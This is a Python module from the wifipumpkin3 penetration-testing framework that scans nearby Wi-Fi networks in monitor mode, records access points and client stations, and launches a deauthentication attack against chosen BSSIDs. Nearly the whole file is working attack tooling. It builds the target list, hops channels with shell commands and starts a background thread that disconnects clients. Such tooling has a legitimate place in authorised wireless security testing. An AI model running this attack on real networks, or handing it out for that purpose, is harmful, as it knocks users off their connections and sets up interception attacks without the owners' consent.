from wifipumpkin3.core.common.terminal import ModuleUI
from wifipumpkin3.core.config.globalimport import *
from wifipumpkin3.core.utility.printer import (
    display_messages,
    setcolor,
    display_tabulate,
)
from random import randrange
import time, sys
from multiprocessing import Process
from scapy.all import *
from wifipumpkin3.core.common.platforms import Linux
from tabulate import tabulate
from wifipumpkin3.core.packets.wireless import ThreadDeauth

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

PROBE_REQUEST_TYPE = 0
PROBE_REQUEST_SUBTYPE = 4
DOT11_REQUEST_SUBTYPE = 2


class ModPump(ModuleUI):
    """Sends deauthentication packets to a wifi network AP"""

    name = "wifideauth"

    options = {
        "interface": ["wlanx", "Name network interface wireless "],
        "client": [
            "ff:ff:ff:ff:ff:ff",
            "the device MAC Address from client to disconnect",
        ],
        "timeout": [0, "Time duration of scan network wireless (ex: 0 infinity)"],
    }
    completions = list(options.keys())

    def __init__(self, parse_args=None, root=None):
        self.parse_args = parse_args
        self.root = root
        self.name_module = self.name
        self.aps = {}
        self._mac_blacklist = set()
        self._mac_whitelist = set(["00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"])
        self.is_running = False
        self.clients = {}
        self.table_headers_wifi = [
            "CH",
            "SSID",
            "BSSID",
            "RSSI",
            "Privacy",
        ]
        self.table_headers_STA = ["BSSID", "STATION", "PWR", "Frames", "Probe"]
        self.table_output = []
        super(ModPump, self).__init__(parse_args=self.parse_args, root=self.root)

    def do_show_scan(self, args):
        """show result scanner wireless network"""
        if not self.aps:
            print(display_messages("Scanner result not found", error=True))
            return
        self.showDataOutputScanNetworks()

    def do_targets(self, args):
        """show device targets to Deauth Atack"""
        if not self._mac_blacklist:
            print(display_messages("required: no targets found", error=True))
            return
        print(display_messages("Targets:", info=True, sublime=True))
        table_targets = []
        table_headers_targets = ["BSSID"]
        for bssid in self._mac_blacklist:
            table_targets.append([setcolor(bssid, color="red")])
        display_tabulate(table_headers_targets, table_targets)
        print("\n")

    def do_add(self, args):
        """add target by mac address (bssid)"""
        try:
            mac_address = args.split()[0]
        except IndexError:
            print(display_messages("required: no arguments found", error=True))
            return

        if "." in mac_address:
            for target in self.aps.keys():
                if Linux.check_is_mac(target):
                    self._mac_blacklist.add(target)
            return

        if not Linux.check_is_mac(mac_address):
            print(
                display_messages("No valid mac address".format(mac_address), error=True)
            )
            return

        self._mac_blacklist.add(mac_address)

    def complete_add(self, text, args, start_index, end_index):
        if text:
            return [
                command for command in list(self.aps.keys()) if command.startswith(text)
            ]
        else:
            return list(self.aps.keys())

    def help_add(self):
        self.show_help_command("help_wifideauth_add_command")

    def do_rm(self, args):
        """remove target by mac address (bssid)"""
        try:
            mac_address = args.split()[0]
        except IndexError:
            print(display_messages("required: no arguments found:", error=True))
            return
        if "." in mac_address:
            self._mac_blacklist.clear()
            return

        if not Linux.check_is_mac(mac_address):
            print(
                display_messages("No valid mac address".format(mac_address), error=True)
            )
            return
        if mac_address not in self._mac_blacklist:
            print(
                display_messages(
                    "Target MAC address not found".format(mac_address), error=True
                )
            )
            return

        self._mac_blacklist.remove(mac_address)

    def complete_rm(self, text, args, start_index, end_index):
        if text:
            return [
                command for command in list(self.aps.keys()) if command.startswith(text)
            ]
        else:
            return list(self.aps.keys())

    def help_rm(self):
        self.show_help_command("help_wifideauth_rm_command")

    def do_scan(self, args):
        """start scanner wireless networks AP"""
        print(
            display_messages(
                "setting interface: {} monitor mode".format(
                    setcolor(self.options.get("interface")[0], color="green")
                ),
                info=True,
            )
        )
        self.set_monitor_mode("monitor")
        print(display_messages("starting Channel Hopping ", info=True))
        self.p = Process(
            target=self.channel_hopper, args=(self.options.get("interface")[0],)
        )
        self.p.daemon = True
        self.p.start()
        print(display_messages("sniffing... ", info=True))
        sniff(
            iface=self.options.get("interface")[0],
            prn=self.sniffAp,
            timeout=None
            if int(self.options.get("timeout")[0]) == 0
            else int(self.options.get("timeout")[0]),
        )
        self.p.terminate()
        self.set_monitor_mode()
        print(display_messages("thread sniffing successfully stopped", info=True))

    def do_start(self, args):
        """execute deauth module attack"""
        if self._background_mode:
            print(
                display_messages(
                    "there are a deauth attack in brackground.", error=True
                )
            )
            return

        client_mac = self.options.get("client")[0]
        interface = self.options.get("interface")[0]
        if not self._mac_blacklist:
            print(
                display_messages(
                    "please, select a target to deauth attack ", error=True
                )
            )
            return

        print(
            display_messages(
                "enable interface: {} to monitor mode".format(interface), info=True
            )
        )

        print(
            display_messages("Wi-Fi deauthentication attack", info=True, sublime=True)
        )

        print(
            display_messages(
                "the MAC address: {} of the client to be deauthenticated".format(
                    setcolor(client_mac, color="blue")
                ),
                info=True,
            )
        )

        for target_mac in self._mac_blacklist:
            info_target = self.aps.get(target_mac)
            if info_target:
                channel = info_target.get("channel")
                print(
                    display_messages(
                        "waiting for beacon frame (BSSID: {}) on channel {} ".format(
                            setcolor(target_mac, color="orange"), channel
                        ),
                        info=True,
                    )
                )

            print(
                display_messages(
                    "Sending DeAuth to station -- STMAC: [{}] ".format(
                        setcolor(target_mac, color="red")
                    ),
                    info=True,
                )
            )

        self.set_monitor_mode("monitor")
        self.thread_deauth = ThreadDeauth(self._mac_blacklist, client_mac, interface)
        self.thread_deauth.setObjectName("wifideauth")
        self.thread_deauth.start()
        self.is_running = True
        self.set_background_mode(True)

    def do_stop(self, args):
        """stop attack deauth module"""
        if self.is_running:
            self.thread_deauth.stop()
            self.set_background_mode(False)
            self.is_running = False

    def channel_hopper(self, interface):
        while True:
            try:
                channel = randrange(1, 11)
                os.system("iw dev %s set channel %d" % (interface, channel))
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def handle_probe(self, pkt):
        if (
            pkt.haslayer(Dot11ProbeReq)
            and "\x00".encode() not in pkt[Dot11ProbeReq].info
        ):
            essid = pkt[Dot11ProbeReq].info
        else:
            essid = "Hidden SSID"
        client = pkt[Dot11].addr2

        if client in self._mac_whitelist or essid in self._mac_whitelist:
            return

        if client not in self.clients:
            self.clients[client] = []

        if essid not in self.clients[client]:
            self.clients[client].append(essid)
            self.aps["(not associated)"] = {}
            self.aps["(not associated)"]["STA"] = {
                "Frames": 1,
                "BSSID": "(not associated)",
                "Station": client,
                "Probe": essid,
                "PWR": self.getRSSIPacketClients(pkt),
            }

    def getRSSIPacket(self, pkt):
        rssi = -100
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    rssi = pkt[RadioTap].dBm_AntSignal
        return rssi

    def getRSSIPacketClients(self, pkt):
        rssi = -100
        if pkt.haslayer(RadioTap):
            rssi = pkt[RadioTap].dBm_AntSignal
        return rssi

    def getStationTrackFrame(self, pkt):
        if (
            pkt.haslayer(Dot11)
            and pkt.getlayer(Dot11).type == DOT11_REQUEST_SUBTYPE
            and not pkt.haslayer(EAPOL)
        ):

            sender = pkt.getlayer(Dot11).addr2
            receiver = pkt.getlayer(Dot11).addr1
            if sender in self.aps.keys():
                if Linux.check_is_mac(receiver):
                    if not receiver in self._mac_whitelist:
                        self.aps[sender]["STA"] = {
                            "Frames": 1,
                            "BSSID": sender,
                            "Station": receiver,
                            "Probe": "",
                            "PWR": self.getRSSIPacketClients(pkt),
                        }
                    if "STA" in self.aps[sender]:
                        self.aps[sender]["STA"]["Frames"] += 1
                        self.aps[sender]["STA"]["PWR"] = self.getRSSIPacketClients(pkt)

            elif receiver in self.aps.keys():
                if Linux.check_is_mac(sender):
                    if not sender in self._mac_whitelist:
                        self.aps[receiver]["STA"] = {
                            "Frames": 1,
                            "BSSID": receiver,
                            "Station": sender,
                            "Probe": "",
                            "PWR": self.getRSSIPacketClients(pkt),
                        }
                    if "STA" in self.aps[receiver]:
                        self.aps[receiver]["STA"]["Frames"] += 1
                        self.aps[receiver]["STA"]["PWR"] = self.getRSSIPacketClients(
                            pkt
                        )

    def handle_beacon(self, pkt):
        if not pkt.haslayer(Dot11Elt):
            return

        essid = (
            pkt[Dot11Elt].info
            if "\x00".encode() not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != ""
            else "Hidden SSID"
        )
        bssid = pkt[Dot11].addr3
        client = pkt[Dot11].addr2
        if (
            client in self._mac_whitelist
            or essid in self._mac_whitelist
            or bssid in self._mac_whitelist
        ):
            return

        try:
            channel = int(ord(pkt[Dot11Elt:3].info))
        except:
            channel = 0

        rssi = self.getRSSIPacket(pkt)

        p = pkt[Dot11Elt]
        capability = p.sprintf(
            "{Dot11Beacon:%Dot11Beacon.cap%}\
                {Dot11ProbeResp:%Dot11ProbeResp.cap%}"
        )

        crypto = set()
        while isinstance(p, Dot11Elt):
            if p.ID == 48:
                crypto.add("WPA2")
            elif p.ID == 221 and p.info.startswith("\x00P\xf2\x01\x01\x00".encode()):
                crypto.add("WPA")
            p = p.payload

        if not crypto:
            if "privacy" in capability:
                crypto.add("WEP")
            else:
                crypto.add("OPN")

        enc = "/".join(crypto)
        self.aps[bssid] = {
            "ssid": essid,
            "channel": channel,
            "capability": capability,
            "enc": enc,
            "rssi": rssi,
        }

    def showDataOutputScanNetworks(self):
        self.table_output = []
        self.table_station = []
        for bssid, info in self.aps.items():
            if not "(not associated)" in bssid:
                self.table_output.append(
                    [info["channel"], info["ssid"], bssid, info["rssi"], info["enc"]]
                )
        display_tabulate(self.table_headers_wifi, self.table_output)
        print("\n")
        for bssid, info in self.aps.items():
            if "STA" in info:
                self.table_station.append(
                    [
                        info["STA"]["BSSID"],
                        info["STA"]["Station"],
                        info["STA"]["PWR"],
                        info["STA"]["Frames"],
                        info["STA"]["Probe"],
                    ]
                )
        if len(self.table_station) > 0:
            display_tabulate(self.table_headers_STA, self.table_station)

    def sniffAp(self, pkt):
        self.getStationTrackFrame(pkt)
        if (
            pkt.haslayer(Dot11Beacon)
            or pkt.haslayer(Dot11ProbeResp)
            or pkt.haslayer(Dot11ProbeReq)
        ):

            if pkt.type == PROBE_REQUEST_TYPE and pkt.subtype == PROBE_REQUEST_SUBTYPE:
                self.handle_probe(pkt)

            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                self.handle_beacon(pkt)

            os.system("clear")
            self.showDataOutputScanNetworks()
            print(display_messages("press CTRL+C to stop scanning", info=True))

    def set_monitor_mode(self, mode="manager"):
        if not self.options.get("interface")[0] in Linux.get_interfaces().get("all"):
            print(display_messages("the interface was not found!", error=True))
            sys.exit(1)
        os.system("ifconfig {} down".format(self.options.get("interface")[0]))
        os.system("iwconfig {} mode {}".format(self.options.get("interface")[0], mode))
        os.system("ifconfig {} up".format(self.options.get("interface")[0]))
